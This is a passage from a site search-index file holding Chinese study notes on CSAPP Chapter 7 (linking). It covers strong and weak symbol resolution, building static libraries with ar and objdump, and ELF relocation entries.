\u88ab\u5176\u5b83\u6a21\u5757\u5b9a\u4e49\uff0c\u540c\u65f6\u88ab\u8be5\u6a21\u5757\u5f15\u7528\u7684\u5168\u5c40\u7b26\u53f7\uff0c\u540d\u4e3a\u5916\u90e8\u7b26\u53f7 External Symbols</li> <li>(3) \u53ea\u80fd\u88ab\u8be5\u6a21\u5757\u5b9a\u4e49\u548c\u5f15\u7528\u7684\u5c40\u90e8\u7b26\u53f7<ul> <li>\u533a\u522b\u5c40\u90e8\u7b26\u53f7\u548c\u5168\u5c40\u7b26\u53f7\u7684\u5173\u952e\u5728\u4e8e <code>static</code> \u5c5e\u6027\uff0c\u5e26\u6709 <code>static</code> \u5c5e\u6027\u7684\u51fd\u6570\u548c\u53d8\u91cf\u4e0d\u80fd\u88ab\u5176\u5b83\u6a21\u5757\u5f15\u7528\uff0c\u529f\u80fd\u7c7b\u4f3c Java \u4e2d\u7684 <code>public</code> \u548c <code>private</code></li> </ul> </li> </ul>"},{"location":"Accumulation/CSAPP/Chapter7/#_4","title":"\u7b26\u53f7\u89e3\u6790","text":"<p>\u5728\u7f16\u8bd1\u65f6\uff0c\u7f16\u8bd1\u5668\u4f1a\u5b9a\u4e49\u6bcf\u4e2a \u5168\u5c40\u7b26\u53f7 \u4e3a\u5f3a\u7b26\u53f7\u6216\u5f31\u7b26\u53f7\uff0c\u5e76\u628a\u5f3a\u5f31\u4fe1\u606f\u9690\u542b\u5728\u7b26\u53f7\u8868\u4e2d\uff1a</p> <ul> <li>Strong Symbols \uff1a \u51fd\u6570\u548c\u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf</li> <li>Weak Symbols \uff1a \u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf</li> </ul> <p>\u63a5\u4e0b\u6765\uff0c\u5206\u4e09\u79cd\u60c5\u51b5\u8bb2\u89e3\u5982\u4f55\u5904\u7406\u591a\u91cd\u5b9a\u4e49\u7684\u7b26\u53f7\u540d</p> <p>\u591a\u4e2a\u540c\u540d\u7684\u5f3a\u7b26\u53f7\u4e00\u8d77\u51fa\u73b0</p> <pre><code>foo1.c\nint main(){\n    return 0;\n}\n---\nbar1.c\nint main(){\n    return 0;\n}\n</code></pre> <p>\u4e24\u4e2a\u6e90\u6587\u4ef6\u4e2d\u90fd\u6709\u51fd\u6570\u540d\u4e3a <code>main</code> \u7684\u51fd\u6570\uff0c\u5f3a\u7b26\u53f7 <code>main</code> \u88ab\u5b9a\u4e49\u4e86\u4e24\u6b21\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u94fe\u63a5\u5668\u4f1a\u751f\u6210\u4e00\u6761\u9519\u8bef\u7684\u4fe1\u606f</p> <pre><code>foo2.c\nint x=114514;\nint main(){\n    return 0;\n}\n---\nbar1.c\nint x=114514;\nint func(){\n    return 0;\n}\n</code></pre> <p>\u540c\u7406\uff0c\u5177\u6709\u76f8\u540c\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u540d\u4e5f\u4f1a\u4ea7\u751f\u7c7b\u4f3c\u9519\u8bef</p> <p>\u4e00\u4e2a\u5f3a\u7b26\u53f7\u548c\u591a\u4e2a\u540c\u540d\u5f31\u7b26\u53f7\u4e00\u8d77\u51fa\u73b0</p> <pre><code>foo3.c\nvoid f(void);\nint x = 114514;\nint main(){\n    f();\n    printf(\"x=%d\\n\",x);\n    return 0;\n}\n---\nbar3.c\nint x;\nvoid f(){\n    x = 1919810;\n}\n</code></pre> <p>\u7531\u4e8e <code>bar3.c</code> \u4e2d\u7684 <code>int x</code> \u672a\u521d\u59cb\u5316\uff0c\u4e3a\u5f31\u7b26\u53f7\uff0c\u90a3\u4e48\u5bf9\u4e8c\u8005\u6267\u884c\u94fe\u63a5\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u94fe\u63a5\u5668\u4f1a\u9009\u62e9\u5728 <code>foo3.c</code> \u4e2d\u5b9a\u4e49\u7684\u5f3a\u7b26\u53f7\uff0c\u4e0d\u4f1a\u63d0\u793a\u9519\u8bef\u6216\u8005\u8b66\u544a\uff08\u5373\uff0c<code>bar3.c</code> \u4e2d<code>x=1919810</code> \u7684 <code>x</code> \u6307\u7684\u662f <code>foo3.c</code> \u4e2d\u7684\u5168\u5c40\u53d8\u91cf <code>x</code>\uff09</p> <p>\u8f93\u51fa <code>x=1919810</code></p> <pre><code>foo4.c\nvoid f(void);\nint y = 1919810;\nint x = 114514;\nint main(){\n    f();\n    printf(\"x=%d y=%d\\n\",x,y);\n    return 0;\n}\n---\nbar4.c\ndouble x;\nvoid f(){\n    x = -0.0;\n//10 00 00 ... 00 00\n}\n</code></pre> <p>\u7531\u4e8e <code>double</code> \u7c7b\u578b\u5360 8 \u4e2a\u5b57\u8282\uff0c\u800c <code>int</code> \u7c7b\u578b\u5360 4 \u4e2a\u5b57\u8282\uff0c\u5bf9\u4e8e\u5730\u5740\u7d27\u90bb\u7684\u5168\u5c40\u53d8\u91cf\uff08\u5728\u5806\u4e2d\uff09\uff0c<code>x</code> \u548c <code>y</code> \u7684\u503c\u90fd\u4f1a\u6539\u53d8</p> <p>\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u53ef\u4ee5\u5728\u7f16\u8bd1\u7684\u65f6\u5019\u6dfb\u52a0 <code>-fno-common</code> \u7f16\u8bd1\u9009\u9879\uff0c\u5f53\u9047\u5230\u591a\u91cd\u5b9a\u4e49\u7684\u5168\u5c40\u7b26\u53f7\u65f6\uff0c\u4f1a\u89e6\u53d1\u4e00\u4e2a\u9519\u8bef</p> <p>\u4f7f\u7528 <code>-Werror</code> \u9009\u9879\uff0c\u628a\u6240\u6709\u8b66\u544a\u53d8\u6210\u9519\u8bef</p> <p>\u591a\u4e2a\u540c\u540d\u7684\u5f31\u7b26\u53f7\u4e00\u8d77\u51fa\u73b0</p> <p>\u5f85\u529e\u4e2d...</p>"},{"location":"Accumulation/CSAPP/Chapter7/#_5","title":"\u9759\u6001\u5e93","text":"<p>\u5728 linux \u7cfb\u7edf\u4e2d\uff0c\u9759\u6001\u5e93\u4ee5 archive \u7684\u7279\u6b8a\u6587\u4ef6\u683c\u5f0f\u5b58\u653e\u5728\u78c1\u76d8\u4e0a\u3002archive (\u5b58\u6863)\u662f\u4e00\u7ec4\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u7684\u96c6\u5408\uff0c\u6587\u4ef6\u540e\u7f00\u4e3a <code>.a</code></p> <p>\u5176\u4e2d\uff0cC\u8bed\u8a00\u7684\u5e93\u51fd\u6570\u5927\u591a\u90fd\u5728 <code>libc.a</code> \u7684\u5e93\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>objdump -t</code> \u547d\u4ee4\u67e5\u770b\u5176\u5185\u5bb9</p> <pre><code>\u276f objdump -t /usr/lib/x86_64-linux-gnu/libc.a &gt; libc\n\u276f grep -n printf libc\n5403:asprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n5438:dprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n5461:fprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n5735:printf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n6182:reg-printf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n6280:snprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n6291:sprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n6427:vfprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n6571:vfwprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n6714:vprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n6889:fxprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n7505:iovsprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n7841:fwprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n7852:swprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n7863:vwprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n7874:wprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n7920:vswprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n8381:vasprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n8401:iovdprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n8429:vsnprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n8446:obprintf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n33275:dl-printf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n</code></pre> <p>\u7531\u4e8e\u5185\u5bb9\u8fc7\u591a\uff0c\u6211\u4eec\u5728\u540e\u9762\u52a0\u4e0a <code>&gt; libc</code> \u5c06\u5176\u8f93\u51fa\u5230\u5f53\u524d\u76ee\u5f55\u7684 <code>libc</code> \u6587\u4ef6\u4e0b\uff0c\u5e76\u4f7f\u7528 <code>grep</code> \u547d\u4ee4\u67e5\u627e <code>printf</code> \uff0c\u53ef\u4ee5\u770b\u5230 <code>printf</code> \u4f4d\u4e8e 5735 \u884c</p> <p>\u6253\u5f00\u8fd9\u4e2a\u6587\u4ef6\uff0c\u627e\u5230\u5bf9\u5e94\u884c\uff0c\u53ef\u4ee5\u770b\u5230 <code>printf</code> \u5b9a\u4e49\u5728 <code>printf.o</code> \u4e2d\uff1a</p> <pre><code> 5735 printf.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n 5736\n 5737 SYMBOL TABLE:\n 5738 0000000000000000 l    d  .text  0000000000000000 .text\n 5739 0000000000000000 g     F .text  00000000000000c6 __printf\n 5740 0000000000000000         *UND*  0000000000000000 stdout\n 5741 0000000000000000         *UND*  0000000000000000 .hidden __vfprintf_internal\n 5742 0000000000000000         *UND*  0000000000000000 __stack_chk_fail\n 5743 0000000000000000 g     F .text  00000000000000c6 _IO_printf\n 5744 0000000000000000 g     F .text  00000000000000c6 printf\n</code></pre> <p>\u4f7f\u7528 <code>ar -x /usr/lib/x86_64-linux-gnu/libc.a</code> \u5c06 <code>libc.a</code> \u7684\u6240\u6709\u76ee\u6807\u6587\u4ef6\u89e3\u538b</p> <p>\u63a5\u4e0b\u6765\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u6f14\u793a\u6784\u9020\u9759\u6001\u5e93\u7684\u8fc7\u7a0b</p> <pre><code>addvec.c:\n 1 int addcnt = 0;\n 2 void addvec(int *x,int *y,int *z,int n){\n 3         int i;\n 4         addcnt++;\n 5         for(i=0;i&lt;n;i++)\n 6                 z[i] = x[i] + y[i];\n 7 }\n ---\n multvec.c:\n  1 int multcnt = 0;\n 2 void multvec(int *x,int *y,int *z,int n){\n 3         int i;\n 4         multcnt++;\n 5         for(i=0;i&lt;n;i++)\n 6                 z[i] = x[i] * y[i];\n 7 }\n</code></pre> <p><code>addvec</code> \u7528\u6765\u5b9e\u73b0\u5411\u91cf\u5143\u7d20\u7d2f\u52a0\uff0c<code>multvec</code> \u7528\u6765\u5b9e\u73b0\u5411\u91cf\u5143\u7d20\u7d2f\u79ef\u3002\u4f7f\u7528 <code>gcc -c addvec.c multvec.c</code> \u6765\u7f16\u8bd1\u8fd9\u4e24\u4e2a\u6587\u4ef6\uff0c\u5176\u4e2d\u7f16\u8bd1\u9009\u9879 <code>-c</code> \u8868\u793a\u53ea\u8fdb\u884c\u7f16\u8bd1\u548c\u6c47\u7f16\uff0c\u4e0d\u8fdb\u884c\u94fe\u63a5\u7684\u64cd\u4f5c\uff0c\u4ece\u800c\u5f97\u5230\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6 <code>addvec.o</code> \u548c <code>multvec.o</code> </p> <p>\u4f7f\u7528 <code>ar rcs libvecter.a addvec.o multvec.o</code> \u547d\u4ee4\u6784\u9020\u9759\u6001\u5e93\u6587\u4ef6\uff0c\u5f97\u5230\u4e00\u4e2a\u540d\u4e3a <code>libvector.a</code> \u7684\u9759\u6001\u5e93\uff0c\u5176\u5185\u5bb9\u53ef\u4ee5\u901a\u8fc7 <code>objdump</code> \u67e5\u770b\uff1a</p> <pre><code>\u276f objdump -t libvecter.a\n\u5728\u5f52\u6863\u6587\u4ef6 libvecter.a \u4e2d\uff1a\n\naddvec.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n\nSYMBOL TABLE:\n0000000000000000 l    df *ABS*  0000000000000000 addvec.c\n0000000000000000 l    d  .text  0000000000000000 .text\n0000000000000000 g     O .bss   0000000000000004 addcnt\n0000000000000000 g     F .text  0000000000000083 addvec\n\n\n\nmultvec.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n\nSYMBOL TABLE:\n0000000000000000 l    df *ABS*  0000000000000000 multvec.c\n0000000000000000 l    d  .text  0000000000000000 .text\n0000000000000000 g     O .bss   0000000000000004 multcnt\n0000000000000000 g     F .text  0000000000000085 multvec\n</code></pre> <p>\u6784\u9020\u6d4b\u8bd5\u51fd\u6570\uff0c\u51fd\u6570 <code>main</code> \u8c03\u7528\u4e86\u51fd\u6570 <code>addvec</code> \uff0c\u5934\u6587\u4ef6 <code>vector.h</code> \u4e2d\u5b9a\u4e49\u4e86 <code>libvector.a</code> \u4e2d\u7684\u51fd\u6570\u539f\u578b</p> <pre><code>main.c:\n 1 #include &lt;stdio.h&gt;\n 2 #include \"vector.h\"\n 3\n 4 int x[2] = {1,2};\n 5 int y[2] = {3,4};\n 6 int z[2];\n 7\n 8 int main(){\n 9         addvec(x,y,z,2);\n10         printf(\"z = [%d,%d]\\n\",z[0],z[1]);\n11         return 0;\n12 }\n</code></pre> <p>\u5176\u4e2d\uff0c\u5934\u6587\u4ef6 <code>vector.h</code> \u7684\u5185\u5bb9\u5982\u4e0b\uff1a</p> <pre><code>#ifndef _vector_H_\n#define _vector_H_\n    void addvec(int *x,int *y,int *z,int n);\n    void multvec(int *x,int *y,int *z,int n);\n#endif\n</code></pre> <p>\u4f7f\u7528\u5982\u4e0b\u8bed\u53e5\uff0c\u4f9d\u6b21\u8fdb\u884c\u7f16\u8bd1\u3001\u94fe\u63a5\uff1a</p> <pre><code>&gt; gcc -c main.c\n&gt; gcc -static -o prog main.o ./libvector.a\n</code></pre> <p>\u4ece\u800c\u5f97\u5230\u53ef\u6267\u884c\u6587\u4ef6 <code>prog</code> \uff0c\u53ef\u4ee5\u6b63\u786e\u8fd0\u884c</p> <pre><code>\u276f ./prog\nz = [4,6]\n</code></pre> <p>\u66f4\u591a\u9759\u6001\u5e93\u4f7f\u7528\u65b9\u5f0f</p> <p>\u4e0d\u5bfc\u5165 <code>vector.h</code> \uff0c\u4f7f\u7528 <code>gcc main.c ./libvector.a</code> \u53ef\u4ee5\u751f\u6210\u6b63\u786e\u7684\u53ef\u6267\u884c\u7a0b\u5e8f</p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>gcc main.c -L./ -lvector</code> \uff0c\u5176\u4e2d <code>-L</code> \u9009\u9879\u6307\u5b9a\u4e86\u5e93\u6587\u4ef6\u641c\u7d22\u9ed8\u8ba4\u76ee\u5f55\uff0c <code>-l</code> \u540e\u9762\u8981\u63a5\u5e93\u540d\uff0c\u5373\u4e0d\u5305\u542b<code>lib</code>\u548c\u62d3\u5c55\u540d\u7684\u5b57\u7b26\u4e32</p> <p></p> <p>\u4e3a\u4ec0\u4e48\u4f7f\u7528\u4e86\u5e93\u6587\u4ef6 <code>libc.a</code> \u4f46\u662f\u624b\u52a8\u94fe\u63a5\u65f6\u4e0d\u9700\u8981\u5bfc\u5165\u5462\uff1f</p> <p>\u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f\u603b\u662f\u81ea\u52a8\u628a <code>libc.a</code> \u4f20\u7ed9\u94fe\u63a5\u5668\uff0c\u56e0\u6b64\u5176\u5b9e\u4e0a\u8ff0\u94fe\u63a5\u547d\u4ee4\u7684\u5b8c\u6574\u5199\u6cd5\u4e3a <code>gcc -static -o prog main.o ./libvector.a libc.a</code></p> <p>\u5728\u94fe\u63a5\u5668\u5bf9\u5e93\u6587\u4ef6\u8fdb\u884c\u626b\u63cf\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5b9e\u9645\u4e0a\u9700\u8981\u7ef4\u62a4\u4e09\u4e2a\u96c6\u5408\uff1a</p> <ul> <li>\u96c6\u5408E\uff1a\u7528\u6765\u5b58\u653e\u94fe\u63a5\u5668\u626b\u63cf\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u7684\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u3002\u5728\u8fde\u63a5\u5373\u5c06\u5b8c\u6210\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u96c6\u5408\u4e2d\u7684\u6587\u4ef6\u4f1a\u88ab\u5408\u5e76\u5f62\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u3002</li> <li>\u96c6\u5408U\uff1a\u7528\u6765\u5b58\u653e\u88ab\u5f15\u7528\u4e86\uff0c\u4f46\u662f\u5c1a\u672a\u5b9a\u4e49\u7684\u7b26\u53f7\u3002</li> <li>\u96c6\u5408D\uff1a\u7528\u6765\u5b58\u653e\u8f93\u51fa\u6587\u4ef6\u4e2d\u5df2\u5b9a\u4e49\u7684\u7b26\u53f7\u3002</li> </ul> <p>\u5bf9\u4e8e\u547d\u4ee4\u884c\u4e2d\u6bcf\u4e00\u4e2a\u8f93\u5165\u6587\u4ef6\uff0c\u94fe\u63a5\u5668\u90fd\u4f1a\u5224\u65ad\u5176\u662f\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u8fd8\u662f\u4e00\u4e2a\u9759\u6001\u5e93\u6587\u4ef6\uff0c\u5982\u679c\u662f\u76ee\u6807\u6587\u4ef6\uff0c\u5219\u653e\u5165\u96c6\u5408E\u4e2d\uff0c\u540c\u65f6\u4fee\u6539\u96c6\u5408U\u548cD\u6765\u53cd\u6620\u8be5\u8f93\u5165\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\u5b9a\u4e49\u548c\u5f15\u7528</p> <p>\u5982\u4e0a\u4f8b\u4e2d\uff0c\u94fe\u63a5\u5668\u9996\u5148\u5224\u65ad <code>main.o</code> \u4e3a\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\uff0c\u5c06\u5176\u7f6e\u5165\u96c6\u5408E\uff0c\u7136\u540e\u6839\u636e\u5176\u7b26\u53f7\u8868\uff0c\u5c06 <code>UND</code> \u7c7b\u578b\u7684 <code>addvec</code> \u548c <code>printf</code> \u7f6e\u5165\u96c6\u5408U\uff0c\u5176\u5b83\u5df2\u5b9a\u4e49\u7684\u7b26\u53f7\u7f6e\u5165\u96c6\u5408D</p> <p></p> <p>\u5f53\u94fe\u63a5\u5668\u8bfb\u53d6\u5230\u9759\u6001\u5e93\u6587\u4ef6 <code>libvector.a</code> \u65f6\uff0c\u94fe\u63a5\u5668\u4f1a\u53d1\u73b0\u8be5\u9759\u6001\u5e93\u6587\u4ef6\u6210\u5458 <code>addvec.o</code> \u4e2d\u5b58\u5728\u7b26\u53f7 <code>addvec</code> \u7684\u5b9a\u4e49\uff0c\u6b64\u65f6\u5c06 <code>addvec.o</code> \u52a0\u5165\u96c6\u5408E\uff0c\u5e76\u79fb\u52a8\u96c6\u5408U\u4e2d\u7684 <code>addvec</code> \u5230\u96c6\u5408D\u4e2d</p> <p>\u5bf9 <code>libc.a</code> \u7684\u5224\u65ad\u540c\u7406\uff0c\u4e0d\u518d\u89e3\u91ca\u3002</p> <p>\u5982\u679c\u5bf9\u6240\u6709\u8f93\u5165\u6587\u4ef6\u7684\u626b\u63cf\u5747\u5df2\u5b8c\u6210\uff0c\u4f46\u96c6\u5408U\u975e\u7a7a\uff0c\u5219\u94fe\u63a5\u5668\u8f93\u51fa\u4e00\u4e2a\u9519\u8bef\u5e76\u7ec8\u6b62</p> <p>\u56e0\u6b64\uff0c\u547d\u4ee4\u884c\u4e2d\u5bf9\u8f93\u5165\u6587\u4ef6\u7684\u987a\u5e8f\u4e5f\u6709\u8981\u6c42\u3002</p> <p>\u4f8b\u5982\uff0c<code>foo.c</code> \u8c03\u7528\u4e86 <code>libx.a</code> \u548c <code>libz.a</code> \u4e2d\u7684\u51fd\u6570\uff0c<code>libx.a</code> \u548c <code>libz.a</code> \u53c8\u8c03\u7528\u4e86 <code>liby.a</code> \u4e2d\u7684\u51fd\u6570\uff0c\u6b64\u65f6\u94fe\u63a5\u65b9\u5f0f\u4e3a\uff1a</p> <pre><code>&gt; gcc foo.c libx.a libz.a liby.a\n</code></pre> <p>\uff08\u62d3\u6251\u6392\u5e8f\uff09</p> <p>\u53e6\u4e00\u4e2a\u7279\u6b8a\u4f8b\u5b50\uff0c\u5982\u679c <code>libx.a</code> \u8c03\u7528\u4e86 <code>liby.a</code> \u7684\u51fd\u6570\uff0c\u4f46\u662f <code>liby.a</code> \u4e5f\u8c03\u7528\u4e86 <code>libx.a</code> \u7684\u51fd\u6570\uff0c\u5373\u5b58\u5728\u76f8\u4e92\u5f15\u7528\uff0c\u6b64\u65f6 <code>libx.a</code> \u9700\u8981\u5728\u547d\u4ee4\u884c\u4e2d\u91cd\u590d\u51fa\u73b0\uff1a</p> <pre><code>&gt; gcc foo.c libx.a liby.a libx.a\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u76f4\u63a5\u628a <code>libx.a</code> \u548c <code>liby.a</code> \u5408\u5e76\u6210\u4e00\u4e2a\u9759\u6001\u5e93\u6587\u4ef6</p>"},{"location":"Accumulation/CSAPP/Chapter7/#_6","title":"\u91cd\u5b9a\u4f4d","text":"<p>\u91cd\u5b9a\u4f4d\u8fc7\u7a0b\u4e2d\uff0c\u94fe\u63a5\u5668\u5408\u5e76\u8f93\u5165\u6a21\u5757\uff0c\u5e76\u4e3a\u6bcf\u4e2a\u7b26\u53f7\u5206\u914d\u8fd0\u884c\u65f6\u7684\u5730\u5740\uff0c\u5177\u4f53\u5206\u4e3a\u4e24\u6b65\uff1a</p> <ul> <li>\u7b2c\u4e00\u6b65\uff1a\u91cd\u5b9a\u4f4d section \u548c\u7b26\u53f7\u5b9a\u4e49</li> <li>\u7b2c\u4e8c\u6b65\uff1a\u91cd\u5b9a\u4f4d section \u4e2d\u7684\u7b26\u53f7\u5f15\u7528</li> </ul>"},{"location":"Accumulation/CSAPP/Chapter7/#section","title":"\u91cd\u5b9a\u4f4d section \u548c\u7b26\u53f7\u5b9a\u4e49","text":"<p>\u5047\u8bbe\u8981\u5bf9 <code>main.o</code> \u548c <code>sum.o</code> \u8fdb\u884c\u94fe\u63a5\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u85c9\u6b64\u8bb2\u89e3\u91cd\u5b9a\u4f4d\u7b2c\u4e00\u6b65\u505a\u4e86\u4ec0\u4e48\uff1a</p> <pre><code>&gt; gcc -Og main.c sum.c -o prog\n</code></pre> <p>\u94fe\u63a5\u5668\u5c06 <code>main.o</code> \u548c <code>sum.o</code> \u4e2d\u6240\u6709\u76f8\u540c\u7c7b\u578b\u7684 section \u5408\u5e76\u4e3a\u4e00\u4e2a\u65b0\u7684 section</p> <p></p> <p>\u7531\u4e8e\u5728 64 \u4f4d linux \u7cfb\u7edf\u4e2d\uff0cELF \u53ef\u6267\u884c\u6587\u4ef6\u7684\u9ed8\u8ba4\u4ece\u5730\u5740 <code>0x400000</code> \u5904\u5f00\u59cb\u5206\u914d\uff0c\u6240\u4ee5\u539f\u4e66\u4e2d\u5047\u8bbe\u5408\u6210\u540e\u7684 <code>.text</code> \u7684\u8d77\u59cb\u5730\u5740\u4e3a <code>0x4004d0</code> </p> <p>\u5408\u6210\u5b8c\u6210\u540e\uff0c\u7a0b\u5e8f\u4e2d\u6bcf\u6761\u6307\u4ee4\u548c\u5168\u5c40\u53d8\u91cf\u90fd\u6709\u4e86\u552f\u4e00\u7684\u8fd0\u884c\u65f6\u5185\u5b58\u5730\u5740</p>"},{"location":"Accumulation/CSAPP/Chapter7/#section_1","title":"\u91cd\u5b9a\u4f4d section \u4e2d\u7684\u7b26\u53f7\u5f15\u7528","text":""},{"location":"Accumulation/CSAPP/Chapter7/#_7","title":"\u91cd\u5b9a\u4f4d\u6761\u76ee","text":"<p>\u5373 Relocation Entries</p> <p>\u5f53\u6c47\u7f16\u5668\u9047\u5230\u6700\u7ec8\u4f4d\u7f6e\u4e0d\u786e\u5b9a\u7684\u7b26\u53f7\u5f15\u7528\u65f6\uff0c\u4f1a\u4ea7\u751f\u4e00\u4e2a\u91cd\u5b9a\u4f4d\u6761\u76ee\uff0c\u7528\u6765\u544a\u8bc9\u6c47\u7f16\u5668\u5728\u5408\u6210\u53ef\u6267\u884c\u6587\u4ef6\u65f6\u5e94\u8be5\u5982\u4f55\u4fee\u6539\u8fd9\u4e2a\u5f15\u7528</p> <p>\u4ee3\u7801\u7684\u91cd\u5b9a\u4f4d\u6761\u76ee\u653e\u5728 <code>.rel text</code> \u4e2d\uff0c\u800c\u5df2\u521d\u59cb\u5316\u6570\u636e\u7684\u91cd\u5b9a\u4f4d\u6761\u76ee\u4f4d\u4e8e <code>.rel data</code> \u4e2d</p> <p>ELF \u91cd\u5b9a\u4f4d\u6761\u76ee\u7684\u7ed3\u6784\u4f53\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <pre><code>typedef struct{\n    long offset;\n    long type:32,\n        symbol:32;\n    long addend;\n} ELF64_Rela\n</code></pre> <ul> <li>\u6bcf\u4e2a\u6761\u76ee\u7531\u56db\u4e2a\u5b57\u6bb5\u7ec4\u6210<ul> <li>offset \u8868\u793a\u88ab\u4fee\u6539\u7684\u5f15\u7528\u7684\u8282\u504f\u79fb\u91cf</li> <li>type \u662f\u94fe\u63a5\u5668\u4fee\u6539\u65b0\u7684\u5f15\u7528\u7684\u53c2\u8003\uff0cELF \u4e2d\u5b9a\u4e49\u4e86 32 \u79cd\u91cd\u5b9a\u4f4d\u7c7b\u578b\uff0c\u4e00\u822c\u53ea\u8bb0\u5982\u4e0b\u4e24\u79cd\u5373\u53ef<ul> <li><code>R_X86_64_PC32</code> PC \u76f8\u5bf9\u5730\u5740</li> <li><code>R_X86_64_32</code> \u7edd\u5bf9\u5730\u5740</li> </ul> </li> <li>symbol \u8868\u793a\u88ab\u4fee\u6539\u7684\u5f15\u7528\u662f\u54ea\u4e2a\u7b26\u53f7</li> <li>addend \u662f\u7b26\u53f7\u5e38\u6570\uff0c\u4e00\u4e9b\u7c7b\u578b\u7684\u91cd\u5b9a\u4f4d\u8981\u4f7f\u7528\u5b83\u5bf9\u88ab\u4fee\u6539\u5e94\u7528\u7684\u503c\u505a\u504f\u79fb\u8c03\u6574</li> </ul> </li> </ul>"},{"location":"Accumulation/CSAPP/Chapter7/#_8","title":"\u91cd\u5b9a\u4f4d\u76f8\u5bf9\u5f15\u7528","text":"<p>\u5bf9\u4e8e\u7b2c\u4e8c\u6b65\uff0c\u5047\u8bbe\u51fd\u6570 <code>main</code> \u4e2d\u8c03\u7528\u4e86\u51fd\u6570 <code>sum</code> \uff0c\u90a3\u4e48\u5176\u673a\u5668\u7801\u7684 <code>call</code> \u6307\u4ee4\u6240\u8c03\u7528\u7684\u5730\u5740\u5728\u94fe\u63a5\u8fc7\u7a0b\u4e2d\u5fc5\u987b\u91cd\u5b9a\u4f4d\u5230 <code>sum</code> \u7684\u771f\u6b63\u5730\u5740</p> <pre><code>0000000000000000 &lt;main&gt;:\n   0:   48 83 ec 08             mov    $0x8 ,%rsp\n   4:   be 02 00 00 00          mov    $0x2, %esi\n   9:   bf 00 00 00 00          mov    $0x0, %edi\n                                a : R_X86_64_32 array\n   e:   e8 00 00 00 00          callq  13&lt;main+13&gt;\n                                f : R_X86_64_PC32 sum\n  13:   48 83 c4 08             add    $0x8, %rsp\n  17:   c3                      retq\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6c47\u7f16\u5668\u4ea7\u751f\u4e86\u4e24\u4e2a\u91cd\u5b9a\u4f4d\u6761\u76ee\uff0c\u4e00\u4e2a\u662f\u5bf9\u5168\u5c40\u53d8\u91cf <code>array</code> \u7684\u5f15\u7528\uff0c\u53e6\u4e00\u4e2a\u662f\u5bf9 <code>sum</code> \u7684\u5f15\u7528</p> <p>\u5728\u91cd\u5b9a\u4f4d\u524d\uff0c\u6307\u4ee4 <code>call</code> \u7684\u8d77\u59cb\u5730\u5740\u4f4d\u4e8e\u504f\u79fb <code>0xe</code> \u7684\u5730\u65b9\uff0c<code>0xe8</code> \u8868\u793a\u6307\u4ee4\u7684\u64cd\u4f5c\u7801\uff0c\u7d27\u8ddf\u5728\u64cd\u4f5c\u7801\u540e\u7684\u5185\u5bb9\u88ab\u586b\u5145\u4e3a 0 \uff0c\u63a5\u4e0b\u6765\uff0c\u94fe\u63a5\u5668\u6839\u636e\u5bf9\u4e8e\u51fd\u6570 <code>sum</code> \u7684\u91cd\u5b9a\u4f4d\u6761\u76ee\u6765\u786e\u5b9a\u8fd9\u90e8\u5206\u7684\u5177\u4f53\u5185\u5bb9\uff1a</p> <pre><code>r.offset = 0xf\nr.symbol = sum\nr.type = R_X86_64_PC32\nr.addend = -4\n</code></pre> <p>\u6240\u4ee5\u51fd\u6570 